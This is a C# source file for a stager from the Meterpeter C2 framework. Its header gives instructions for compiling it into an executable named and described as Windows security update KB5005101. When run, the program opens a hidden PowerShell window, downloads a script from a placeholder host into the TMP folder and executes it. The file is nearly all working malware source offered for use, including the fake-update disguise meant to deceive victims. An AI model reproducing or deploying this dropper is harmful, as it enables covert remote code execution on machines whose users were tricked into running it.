/*
   Author: @r00t-3xp10it
   @Meterpeter C2 v2.10.11 - FileLess download crandle!

   Title: StandAlone executable cmdlet FileLess download crandle.
   Description: Program.CS (to be compiled to standalone executable) that allow users to FileLess download\execute external URL's cmdlet's
      
   Dependencies: iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CsOnTheFly.ps1" -OutFile "CsOnTheFly.ps1"
   Compile: .\CsOnTheFly.ps1 -action "compile" -uri "FileLess_KB5005101.cs" -outfile "Update-KB5005101.exe" -filedescription "KB5005101 21H1 Security Update" -iconset "true"
*/

using System.Diagnostics;

namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var filePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";

           Process process = new Process();
           process.StartInfo.FileName = filePath;
           process.StartInfo.Arguments = "cd $Env:TMP;iwr -uri http://CharlieBrown/Update-KB5005101.ps1 -outfile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}